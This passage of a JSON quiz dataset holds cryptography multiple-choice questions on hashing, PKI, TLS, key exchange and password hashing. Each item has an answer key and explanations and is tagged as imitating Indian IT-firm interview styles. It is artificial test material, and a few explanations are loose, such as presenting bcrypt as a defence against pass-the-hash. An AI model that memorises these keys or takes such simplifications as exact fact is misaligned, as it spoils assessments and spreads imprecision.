      "Deloitte-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "When two distinct inputs produce the identical output digest, it is called a Hash Collision. Because a hash function maps an infinite set of possible input messages to a finite number of output digests (e.g., $2^{256}$ for SHA-256), the Pigeonhole Principle mathematically dictates that collisions must exist.",
    "why_other_options_are_wrong": {
      "A": "Malleability refers to the ability of an attacker to alter the ciphertext so it decrypts to a predictable plaintext.",
      "B": "Correct: A collision occurs when two inputs yield the same output; the Pigeonhole Principle proves its inevitability due to domain vs codomain size.",
      "C": "The Avalanche Effect is a desirable property where changing a single bit in the input radically changes at least 50% of the output bits.",
      "D": "Decoherence is a quantum physics concept, completely unrelated to deterministic hash mappings."
    },
    "real_world_application": "Deprecating SHA-1 in Git and digital certificates after Google and CWI demonstrated the SHAttered collision in 2017."
  },
  {
    "id": 23,
    "question": "A user navigates to an internal enterprise web portal and receives a prominent browser warning: 'Your connection is not private (NET::ERR_CERT_AUTHORITY_INVALID)'. The server admin explains: 'The website is using an SSL certificate generated locally with OpenSSL by our IT team.' Why does the browser reject this certificate?",
    "options": {
      "A": "The certificate is unencrypted and transmits cleartext HTTP across the internet.",
      "B": "OpenSSL certificates only function on Linux operating systems and fail on Windows or macOS.",
      "C": "The certificate is self-signed and its root signature does not chain up to any trusted Certificate Authority (CA) in the operating system's root trust store.",
      "D": "The server failed to provide its private key directly to the browser during the ClientHello phase."
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Digital Certificates & Trust Chains",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Web browsers validate an X.509 digital certificate by checking if it was signed by an entity listed in the operating system/browser's pre-installed Root Certificate Authority store. A self-signed certificate has no trusted third-party guarantor, so the browser flags it as untrusted to protect the user from potential Man-in-the-Middle attacks.",
    "why_other_options_are_wrong": {
      "A": "The certificate does enable TLS encryption; the warning is about identity trust, not lack of cryptographic ciphers.",
      "B": "X.509 standards are platform-agnostic and work across all operating systems.",
      "C": "Correct: Without a trusted CA signature chaining to the root store, browsers cannot verify the authenticity of the server's identity.",
      "D": "Servers NEVER share their private key with the client; doing so would destroy all security."
    },
    "real_world_application": "Distributing private enterprise Root CA certificates to domain-joined workstations via Active Directory Group Policy (GPO)."
  },
  {
    "id": 24,
    "question": "Two military communication units in remote outposts need to securely communicate over an insecure radio frequency. They have never met previously and possess no shared secret key. Which cryptographic protocol allows them to establish a shared symmetric secret key over this untrusted channel without transmitting the key itself?",
    "options": {
      "A": "Advanced Encryption Standard (AES-CBC)",
      "B": "Secure Hash Algorithm (SHA-512)",
      "C": "One-Time Pad (OTP)",
      "D": "Diffie-Hellman Key Exchange"
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Key Exchange & Diffie-Hellman",
    "difficulty": "Medium-Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Capgemini-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The Diffie-Hellman (DH) key exchange (and its elliptic curve variant ECDH) is a fundamental cryptographic protocol that allows two parties to agree on a shared secret over an insecure medium without any prior shared secrets, using discrete logarithm / elliptic curve mathematics.",
    "why_other_options_are_wrong": {
      "A": "AES requires both parties to already possess the shared symmetric key beforehand.",
      "B": "SHA-512 is a one-way hashing function, not a key agreement protocol.",
      "C": "A One-Time Pad requires physical pre-distribution of truly random key material equal in length to the message.",
      "D": "Correct: Diffie-Hellman solves the key distribution problem over public networks without sending the secret itself."
    },
    "real_world_application": "Establishing ephemeral forward-secret session keys in TLS 1.3 (ECDHE) and Signal protocol messaging."
  },
  {
    "id": 25,
    "question": "A developer wants to verify whether an ISO disk image downloaded from an open-source mirror server was corrupted during download or tampered with by a malicious mirror host. The developer calculates the SHA-256 hash of the downloaded file and compares it with the hash posted on the project's official HTTPS website. What security property is being validated?",
    "options": {
      "A": "Data Integrity",
      "B": "Data Confidentiality",
      "C": "Network Availability",
      "D": "Sender Non-repudiation"
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Integrity Verification via Checksums",
    "difficulty": "Medium",
    "question_type": "Application-Based",
    "company_pattern": [
      "Wipro-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Comparing the cryptographic hash of a downloaded file against the author's published hash verifies Data Integrity. If even a single byte of the file was modified, corrupted, or backdoored, the avalanche effect guarantees that the computed SHA-256 digest will differ completely.",
    "why_other_options_are_wrong": {
      "A": "Correct: Cryptographic checksums verify that the downloaded payload exactly matches the original byte-for-byte.",
      "B": "The ISO image is public and unencrypted; confidentiality is not being asserted.",
      "C": "Availability relates to whether the mirror server is online and serving requests.",
      "D": "Non-repudiation requires a digital signature signed by a private key, not just an unkeyed hash."
    },
    "real_world_application": "Validating Ubuntu/Kali Linux ISO download hashes using `sha256sum -c` before installing on production bare metal."
  },
  {
    "id": 26,
    "question": "In asymmetric public key infrastructure, if a corporate Certificate Authority (CA) accidentally exposes its own Private Root Key to the public internet, what is the immediate catastrophic consequence?",
    "options": {
      "A": "All existing AES-256 encrypted hard drives worldwide will instantly decrypt.",
      "B": "Any attacker can forge valid, trusted digital certificates for ANY website or domain, enabling undetectable Man-in-the-Middle eavesdropping.",
      "C": "The internet will suffer total denial of service because DNS servers will stop resolving IP addresses.",
      "D": "TCP packets will no longer be able to complete the 3-way SYN-ACK handshake."
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Certificate Authority Trust Failure",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The entire security of PKI hinges on the secrecy of CA private keys. If a root CA private key is compromised, an attacker can generate and sign legitimate-looking SSL certificates for google.com, microsoft.com, or bank portals that every client device will implicitly trust without any browser warning.",
    "why_other_options_are_wrong": {
      "A": "Symmetric hard drive encryption keys are completely separate from CA identity certificates.",
      "B": "Correct: The trust chain collapses; an attacker can issue rogue certificates for any domain and impersonate servers undetectably.",
      "C": "DNS is a name resolution protocol that operates independently of CA certificate hierarchies.",
      "D": "Transport Layer TCP handshakes do not depend on Application/Presentation Layer TLS certificates."
    },
    "real_world_application": "The historical DigiNotar CA compromise in 2011, where forged certificates were used to intercept communications in Iran, leading to DigiNotar's bankruptcy."
  },
  {
    "id": 27,
    "question": "A security analyst reviews the cryptographic cipher suites configured on a legacy banking server and discovers `TLS_RSA_WITH_AES_128_CBC_SHA`. Why does modern NIST and PCI DSS guidance mandate replacing static RSA key exchange with an Ephemeral Diffie-Hellman suite (such as `ECDHE`)?",
    "options": {
      "A": "Static RSA causes browser crashes on all mobile operating systems.",
      "B": "AES-128 is mathematically uncrackable only when paired with Diffie-Hellman.",
      "C": "Static RSA key exchange does not provide Perfect Forward Secrecy (PFS); if the server's private key is stolen in the future, past recorded encrypted sessions can be decrypted.",
      "D": "Diffie-Hellman completely removes the need for digital certificates and Certificate Authorities."
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Perfect Forward Secrecy (PFS)",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Accenture-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In static RSA key exchange, the client encrypts the premaster secret with the server's static public key. If an adversary records all encrypted traffic today and steals the server's private key two years later, they can decrypt all historical recorded traffic. Ephemeral Diffie-Hellman (ECDHE) generates fresh temporary keys for each session, guaranteeing Perfect Forward Secrecy (PFS).",
    "why_other_options_are_wrong": {
      "A": "Browsers support static RSA; it is deprecated for security reasons, not client crash bugs.",
      "B": "AES-128's cryptographic strength is independent of the key exchange algorithm.",
      "C": "Correct: PFS ensures that compromise of long-term server private keys does not compromise past session keys.",
      "D": "ECDHE still requires digital certificates during the handshake to authenticate the server and prevent MITM."
    },
    "real_world_application": "PCI DSS 4.0 requirement enforcing Perfect Forward Secrecy across all payment processing endpoints."
  },
  {
    "id": 28,
    "question": "Which of the following encryption algorithms is classified as a Block Cipher rather than a Stream Cipher?",
    "options": {
      "A": "RC4",
      "B": "ChaCha20",
      "C": "Salsa20",
      "D": "Advanced Encryption Standard (AES)"
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Block vs Stream Ciphers",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Infosys-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "AES operates on fixed-size blocks of plaintext (specifically 128-bit blocks) using substitution-permutation networks, making it a classic Block Cipher. In contrast, RC4, ChaCha20, and Salsa20 generate continuous keystreams combined bitwise via XOR with plaintext, classifying them as Stream Ciphers.",
    "why_other_options_are_wrong": {
      "A": "RC4 is a well-known (and now deprecated) stream cipher.",
      "B": "ChaCha20 is a high-speed stream cipher widely used in modern TLS 1.3 and WireGuard.",
      "C": "Salsa20 is the precursor stream cipher developed by Daniel J. Bernstein upon which ChaCha20 is based.",
      "D": "Correct: AES processes data in discrete 128-bit blocks, making it a block cipher."
    },
    "real_world_application": "Understanding why block ciphers require modes of operation (CBC, GCM, CTR) and padding (PKCS#7)."
  },
  {
    "id": 29,
    "question": "An engineer encrypts a high-resolution bitmap image using AES in Electronic Codebook (ECB) mode. To their surprise, although the pixel data is encrypted, the distinct visual outline of the image subject is still clearly visible in the output image! What is the fundamental flaw of AES-ECB mode?",
    "options": {
      "A": "ECB encrypts each identical 16-byte block of plaintext into the exact same block of ciphertext, leaking data patterns.",
      "B": "ECB mode does not use an encryption key and only performs base64 encoding.",
      "C": "ECB mode inverts the bits of the image header, rendering the pixels into an ASCII art representation.",
      "D": "ECB mode is an asymmetric cipher and requires an elliptic curve initialization vector."
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Block Cipher Modes & ECB Flaw",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In Electronic Codebook (ECB) mode, each plaintext block is encrypted independently with the key without any feedback or Initialization Vector (IV). Consequently, identical plaintext blocks produce identical ciphertext blocks, preserving structural patterns (famously demonstrated by the ECB Penguin).",
    "why_other_options_are_wrong": {
      "A": "Correct: The lack of diffusion/randomization across blocks causes repeated plaintext blocks to yield identical ciphertext blocks.",
      "B": "ECB uses a standard secret key; it is a genuine encryption mode, not simple encoding.",
      "C": "The visual silhouette occurs across the entire payload body, not due to header bit inversion.",
      "D": "ECB is a symmetric block mode and does not use initialization vectors or elliptic curves."
    },
    "real_world_application": "Security code audits flagging and replacing `Cipher.getInstance('AES/ECB/PKCS5Padding')` with `AES/GCM/NoPadding`."
  },
  {
    "id": 30,
    "question": "A digital certificate contains an expiration date and is typically valid for one year. However, if an employee loses a company laptop containing the server's private key, the certificate must be invalidated immediately. Which two standard mechanisms allow clients to verify whether a certificate has been revoked before its expiration date?",
    "options": {
      "A": "ARP Inspection and DHCP Snooping",
      "B": "Certificate Revocation Lists (CRL) and Online Certificate Status Protocol (OCSP)",
      "C": "BGP Anycast and DNSSEC",
      "D": "SNI (Server Name Indication) and DKIM"
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Certificate Revocation (CRL vs OCSP)",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Capgemini-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Certificate Revocation Lists (CRLs) are periodically published lists of revoked serial numbers signed by the CA. Online Certificate Status Protocol (OCSP) provides real-time querying where the client (or web server via OCSP Stapling) queries the CA's responder for the revocation status of a specific certificate.",
    "why_other_options_are_wrong": {
      "A": "ARP Inspection and DHCP Snooping are Layer 2 local switch port security controls.",
      "B": "Correct: CRL and OCSP are the two universal PKI protocols for validating certificate revocation.",
      "C": "BGP Anycast routes traffic and DNSSEC signs DNS records; neither checks X.509 certificate revocation.",
      "D": "SNI sends the requested hostname during TLS handshake; DKIM signs email messages."
    },
    "real_world_application": "Configuring OCSP Stapling in Nginx to eliminate round-trip latency to the CA and protect client privacy."
  },
  {
    "id": 31,
    "question": "What is the primary difference between a Message Authentication Code (MAC / HMAC) and a standard unkeyed cryptographic hash function (such as SHA-256)?",
    "options": {
      "A": "HMAC compresses data into 16 bits, whereas SHA-256 produces 256 bits.",
      "B": "SHA-256 provides encryption for confidentiality, while HMAC provides decryption.",
      "C": "HMAC requires a shared secret key combined with the message, providing both integrity AND origin authenticity, whereas an unkeyed hash only verifies integrity.",
      "D": "HMAC can only be calculated on hardware smart cards, while SHA-256 runs in software."
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "HMAC vs Unkeyed Hash",
    "difficulty": "Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Infosys-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "An unkeyed hash (SHA-256) can be computed by anyone who possesses the message. If an attacker modifies both the message and recomputes the hash, the recipient cannot detect tampering. An HMAC combines the message with a shared secret key ($K$), ensuring that only someone with the secret key could have produced the MAC, verifying both authenticity and integrity.",
    "why_other_options_are_wrong": {
      "A": "HMAC output length matches the underlying hash (e.g., HMAC-SHA256 produces 256 bits).",
      "B": "Neither HMAC nor SHA-256 provides confidentiality (encryption); both are hashing primitives.",
      "C": "Correct: HMAC incorporates a secret key, ensuring authenticity and integrity simultaneously.",
      "D": "Both algorithms run efficiently in software on any modern CPU architecture."
    },
    "real_world_application": "Signing REST API webhooks (such as Stripe and GitHub webhooks) using HMAC-SHA256 signatures."
  },
  {
    "id": 32,
    "question": "An enterprise banking application requires storing customer credit card numbers on disk to process recurring monthly subscriptions. Which cryptographic primitive and approach is legally compliant under PCI DSS requirements?",
    "options": {
      "A": "One-way hashing using SHA-256 with a static salt",
      "B": "Compressing data with gzip and hiding the database behind an internal IP address",
      "C": "Obfuscating strings using Base64 encoding",
      "D": "Strong symmetric encryption such as AES-256 with rigorous key rotation and access controls"
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Cryptographic Primitive Selection",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Credit card Primary Account Numbers (PAN) must be retrievable to execute monthly recurring payments, so one-way hashing cannot be used. PCI DSS mandates strong two-way encryption (AES-256, RSA) with cryptographic keys stored separately from the data in a dedicated Key Management Service (KMS) or Hardware Security Module (HSM).",
    "why_other_options_are_wrong": {
      "A": "Hashing is irreversible; the merchant would be unable to retrieve the credit card number to charge the card next month.",
      "B": "Security through obscurity and compression violates core PCI DSS standards.",
      "C": "Base64 is a reversible encoding scheme with zero security; it provides no encryption whatsoever.",
      "D": "Correct: Reversible data at rest requires strong authenticated symmetric encryption (AES-256) with strict key management."
    },
    "real_world_application": "AWS KMS / HashiCorp Vault tokenization and envelope encryption for payment gateway backends."
  },
  {
    "id": 33,
    "question": "A student in an interview is asked: 'Can RSA be used to sign a document if the document size is 4 gigabytes?' How should the candidate accurately answer?",
    "options": {
      "A": "Yes, by first hashing the 4 GB file into a fixed-length digest (e.g., 32 bytes via SHA-256) and then signing that digest with the RSA private key.",
      "B": "No, RSA has a strict mathematical limit of 245 bytes and cannot sign any file larger than a single paragraph.",
      "C": "Yes, but the system must partition the 4 GB file into 16-megabyte blocks and encrypt every individual block with the RSA private key.",
      "D": "No, digital signatures can only be applied to plain ASCII text files under 1 megabyte."
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Digital Signature Performance & Hashing",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Deloitte-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Digital signatures are practically never applied directly to raw data. Instead, the data of arbitrary size (whether 4 KB or 40 GB) is hashed into a tiny, fixed-size digest (e.g. 256 bits), and only that digest is encrypted with the signer's RSA private key. This is blindingly fast and mathematically sound.",
    "why_other_options_are_wrong": {
      "A": "Correct: Signing the cryptographic hash of the document signs the entire document efficiently and securely.",
      "B": "While RSA plaintext input is limited by key modulus, hashing the file first solves this limitation universally.",
      "C": "Encrypting 4 GB with RSA block-by-block would take hours, bloat file size, and invite structural malleability attacks.",
      "D": "Digital signatures operate on arbitrary binary streams regardless of file format or size."
    },
    "real_world_application": "Operating system kernel updates and Linux package manager (`apt`/`yum`) GPG signature verification."
  },
  {
    "id": 34,
    "question": "Which of the following statements correctly distinguishes between 'Encoding', 'Hashing', and 'Encryption'?",
    "options": {
      "A": "Encoding provides confidentiality; Hashing provides reversibility; Encryption provides data compression.",
      "B": "Encoding transforms data format without keys (reversible); Hashing creates a fixed-length one-way digest (irreversible); Encryption transforms plaintext into ciphertext using a key (reversible with key).",
      "C": "Encoding requires an RSA private key; Hashing requires an AES secret key; Encryption requires no key.",
      "D": "Encoding and Hashing are completely identical; Encryption is used only for hardware firmware."
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Encoding vs Hashing vs Encryption",
    "difficulty": "Medium",
    "question_type": "Comparison",
    "company_pattern": [
      "Wipro-style",
      "HCLTech-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Encoding (e.g. Base64, ASCII) changes representation for compatibility and requires no secret key. Hashing (e.g. SHA-256) is a one-way mathematical reduction for integrity. Encryption (e.g. AES, RSA) provides confidentiality and is reversible only by authorized key holders.",
    "why_other_options_are_wrong": {
      "A": "Encoding provides zero confidentiality, and hashing is explicitly irreversible.",
      "B": "Correct: Encoding = format conversion without keys; Hashing = one-way digest; Encryption = reversible confidentiality using keys.",
      "C": "Encoding uses no keys; hashing typically uses no keys (unless HMAC); encryption fundamentally requires keys.",
      "D": "All three are distinct foundational concepts in information security."
    },
    "real_world_application": "Distinguishing between Base64URL encoding of a JWT header, hashing the payload, and signing with an RS256 private key."
  },
  {
    "id": 35,
    "question": "An adversary intercepts an encrypted HTTPS session. Although the adversary cannot decrypt the payload due to AES-GCM encryption, they observe the IP addresses, packet sizes, timing intervals, and sequence of requests. What type of security analysis is the adversary performing?",
    "options": {
      "A": "SQL Injection Analysis",
      "B": "Hash Collision Preimage Attack",
      "C": "Side-Channel / Traffic Analysis",
      "D": "Buffer Overflow Exploitation"
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Traffic Analysis & Metadata Leakage",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Traffic Analysis is an intelligence and cryptographic evaluation technique that deduces information from patterns in communication (timing, packet sizing, volume, endpoints) even when the payload itself remains fully encrypted and unreadable.",
    "why_other_options_are_wrong": {
      "A": "SQL injection attacks the database layer via application input fields, not network timing metadata.",
      "B": "Preimage attacks attempt to find an input that produces a specific hash output.",
      "C": "Correct: Inferring user activity from metadata, timing, and packet lengths without decrypting the payload is traffic analysis.",
      "D": "Buffer overflows exploit memory management flaws in compiled binaries (like C/C++)."
    },
    "real_world_application": "Why Tor uses fixed 512-byte cells and packet padding to obscure traffic analysis against nation-state surveillance."
  },
  {
    "id": 36,
    "question": "A legacy company still uses the Data Encryption Standard (DES) with a 56-bit key to encrypt internal payroll files. A cryptanalyst points out that DES is fundamentally broken today. What is the exact reason for DES's obsolescence?",
    "options": {
      "A": "A fatal flaw in its S-box construction allows decryption without any computations.",
      "B": "DES only works on 8-bit CPUs and cannot execute on 64-bit operating systems.",
      "C": "DES was mathematically proven to generate identical ciphertext for every plaintext block.",
      "D": "Its 56-bit key space ($2^{56} \\approx 7.2 \\times 10^{16}$ keys) is small enough that modern distributed computing or specialized FPGA hardware can brute-force the entire key space in hours."
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Symmetric Key Length & Exhaustive Search",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "TCS-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A 56-bit key space consists of only $2^{56}$ possible combinations. With modern hardware, custom FPGA rigs (like the EFF Deep Crack machine or modern cloud instances) can test billions of keys per second, exhausting the entire keyspace in under a day, rendering DES completely obsolete.",
    "why_other_options_are_wrong": {
      "A": "The DES S-boxes were actually designed with subtle resistance against differential cryptanalysis.",
      "B": "DES algorithms can be implemented in software on any CPU bit-width.",
      "C": "DES generates pseudorandom ciphertext like any valid Feistel cipher.",
      "D": "Correct: 56 bits is far too short to withstand modern exhaustive brute-force search; AES with 128 or 256 bits is required."
    },
    "real_world_application": "Understanding why NIST withdrew DES and requires AES (minimum 128-bit key space = $3.4 \\times 10^{38}$ possibilities)."
  },
  {
    "id": 37,
    "question": "In asymmetric cryptography, Elliptic Curve Cryptography (ECC) is increasingly chosen over RSA for mobile and IoT devices. What is the primary technical advantage of ECC over RSA?",
    "options": {
      "A": "ECC provides the same or higher level of cryptographic security with significantly shorter key lengths (e.g., 256-bit ECC is roughly equivalent to 3072-bit RSA), reducing CPU, battery, and bandwidth consumption.",
      "B": "ECC is completely immune to quantum computers, whereas RSA is not.",
      "C": "ECC is a symmetric cipher and does not require public and private keys.",
      "D": "ECC does not require mathematics and relies entirely on random hardware noise."
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "ECC vs RSA Advantages",
    "difficulty": "Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Accenture-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Because solving the Elliptic Curve Discrete Logarithm Problem (ECDLP) is significantly harder per bit of key length than factoring large composites in RSA, a 256-bit ECC key offers comparable security to a 3072-bit RSA key. This drastically reduces computation time, power consumption, and handshake payload sizes.",
    "why_other_options_are_wrong": {
      "A": "Correct: ECC achieves equivalent cryptographic strength with drastically smaller keys, saving compute and power on constrained devices.",
      "B": "Both standard RSA and standard ECC are vulnerable to Shor's algorithm on sufficiently powerful quantum computers.",
      "C": "ECC is an asymmetric public-key cryptosystem based on points on elliptic curves.",
      "D": "ECC relies on sophisticated algebraic geometry and finite field arithmetic."
    },
    "real_world_application": "Apple iOS Secure Enclave, Bitcoin (secp256k1), and TLS ECDSA certificates."
  },
  {
    "id": 38,
    "question": "An authentication architect wants to prevent 'Pass-the-Hash' and dictionary attacks against a password verification service. Instead of standard SHA-256, which password hashing algorithm features an adjustable 'Cost Factor' (work factor) specifically designed to consume CPU and memory, making GPU-accelerated cracking economically infeasible?",
    "options": {
      "A": "MD5",
      "B": "bcrypt",
      "C": "CRC32",
      "D": "Base64"
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Key Derivation Functions (bcrypt/Argon2)",
    "difficulty": "Medium-Hard",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Infosys-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "bcrypt (based on the Blowfish cipher's key setup) incorporates an internal iteration count (work factor). As hardware gets faster over the years, system administrators can increase the cost factor (e.g. from 10 to 12 or 14) so that verifying a single password takes ~100-250ms, crippling mass GPU cracking attempts.",
    "why_other_options_are_wrong": {
      "A": "MD5 has a fixed, trivial computational cost and was never designed for passwords.",
      "B": "Correct: bcrypt is an adaptive, slow key-derivation function with configurable work factors.",
      "C": "CRC32 is an error-detecting cyclic checksum with zero cryptographic security.",
      "D": "Base64 is an encoding format, not a hash or security function."
    },
    "real_world_application": "Default password hashing scheme in Node.js (bcryptjs), Ruby on Rails, and Spring Security."
  },
  {
    "id": 39,
    "question": "A web client initiates a TLS handshake with a web server. The server presents its X.509 certificate. What specific cryptographic check does the browser perform to confirm that this certificate was genuinely issued by 'DigiCert Global Root CA' and has not been forged?",
    "options": {
      "A": "The browser decrypts the server's private key using its local session cookie.",
      "B": "The browser sends the raw server certificate to Google's search engine via an HTTP GET request.",
      "C": "The browser uses DigiCert's Public Key (pre-installed in the browser's trust store) to verify the CA's digital signature embedded on the server's certificate.",
      "D": "The browser re-encrypts the server certificate with AES-128 and compares checksum lengths."
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Certificate Signature Verification",
    "difficulty": "Medium-Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The issuing CA signs the certificate by hashing the certificate body and encrypting the hash with the CA's Private Key. The browser, possessing the CA's Public Key in its trusted root store, decrypts the signature to extract the hash and validates it against its own computed hash of the certificate.",
    "why_other_options_are_wrong": {
      "A": "Clients never receive or decrypt server private keys.",
      "B": "Trust validation is performed locally using mathematical signature checks, not web search engine queries.",
      "C": "Correct: Digital signature verification uses the issuing CA's trusted public key to validate the certificate's cryptographic signature.",
      "D": "AES symmetric encryption is unrelated to X.509 certificate signature validation."
    },
    "real_world_application": "The foundational chain of trust establishing lock icons on all modern web browsers."
  },
  {
    "id": 40,
    "question": "An attacker performs a 'Birthday Attack' against a legacy hash function that outputs an 80-bit digest. According to the Birthday Paradox in probability theory, roughly how many randomly generated messages must the attacker hash before having a 50% probability of finding a collision?",
    "options": {
      "A": "$2^{80}$ messages",
      "B": "$2 \\times 80 = 160$ messages",
      "C": "$80^2 = 6,400$ messages",
      "D": "$2^{40}$ messages"
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Birthday Attack & Hash Collision Complexity",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The Birthday Paradox shows that finding ANY two items that share a value is vastly easier than finding a match for one specific targeted value. For an $n$-bit hash function, finding a collision requires testing approximately $\\sqrt{2^n} = 2^{n/2}$ inputs. For an 80-bit hash, $2^{80/2} = 2^{40}$ operations are sufficient to achieve a 50% collision probability.",
    "why_other_options_are_wrong": {
      "A": "Testing $2^{80}$ inputs is the complexity for a Preimage attack (matching a specific pre-selected hash target), not a collision attack.",
      "B": "Simple multiplication ignores the exponential nature of binary state spaces.",
      "C": "Polynomial or quadratic multiplications of the bit length are mathematically invalid for exponential keyspaces.",
      "D": "Correct: The square root of the keyspace ($2^{n/2}$) is the classical complexity of a birthday collision attack ($2^{40}$)."
    },
    "real_world_application": "Why SHA-256 uses 256 bits, guaranteeing that even with a Birthday Attack, an attacker still needs $2^{128}$ operations (computationally impossible today)."
  },
  {
    "id": 41,
    "question": "A company wants to send automated system alert SMS messages to field technicians. The messages contain no private or sensitive information (e.g., 'Pump 4 pressure at 120 PSI'), but it is critical that no unauthorized rogue device can spoof alerts or modify the pressure readings. Which cryptographic service is required?",
    "options": {
      "A": "Integrity and Authenticity without Confidentiality",
      "B": "Confidentiality without Integrity",
      "C": "Non-repudiation and Confidentiality without Integrity",
      "D": "Availability and Secrecy without Authentication"
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Security Objective Trade-offs",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Capgemini-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Because the content is public and non-sensitive, encryption for Confidentiality is unnecessary. However, because spoofing (faking the sender) and tampering (altering pressure numbers) must be prevented, the solution requires Message Authentication and Integrity (e.g., via an attached HMAC or digital signature).",
    "why_other_options_are_wrong": {
      "A": "Correct: Authenticity confirms the alert originated from the real sensor system, and Integrity confirms the readings were not altered in flight.",
      "B": "Confidentiality hides data; it does not stop an attacker from flipping bits or sending fake messages.",
      "C": "Non-repudiation requires integrity as a prerequisite; you cannot have one without the other.",
      "D": "Secrecy is another word for confidentiality, which was explicitly stated as unnecessary."
    },
    "real_world_application": "SCADA / Industrial IoT sensor telemetries where payload encryption is omitted to save battery, but HMAC authentication tags are mandatory."
  },
  {
    "id": 42,
    "question": "During an HTTPS connection setup, the web server's certificate is verified, and both parties agree to use AES-256. How is the AES symmetric 'Session Key' actually established between the client and server in TLS 1.3?",
    "options": {
      "A": "The client generates the session key and sends it in cleartext inside the HTTP header.",
      "B": "Both the client and server independently compute the session key locally using the Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) key exchange protocol.",
      "C": "The Certificate Authority generates the session key and emails it to both parties.",
      "D": "The server's hard-coded permanent private key is used directly as the AES session key for every client."
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "TLS Handshake & Session Key Derivation",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In TLS 1.3, ephemeral Diffie-Hellman (ECDHE) is mandatory. Both client and server exchange public key shares during the ClientHello and ServerHello, allowing both endpoints to mathematically calculate the identical shared secret and derive the symmetric AES session key independently without transmitting it across the wire.",
    "why_other_options_are_wrong": {
      "A": "Sending session keys in cleartext would allow any network eavesdropper to decrypt all traffic instantly.",
      "B": "Correct: ECDHE allows both endpoints to derive the identical session key mathematically without transmitting it.",
      "C": "Certificate Authorities issue identity certificates; they never participate in real-time user session key derivation.",
      "D": "Using a permanent server private key as a symmetric key is impossible and would provide zero forward secrecy."
    },
    "real_world_application": "Understanding Wireshark packet captures showing TLS 1.3 encrypted handshake records."
  },
  {
    "id": 43,
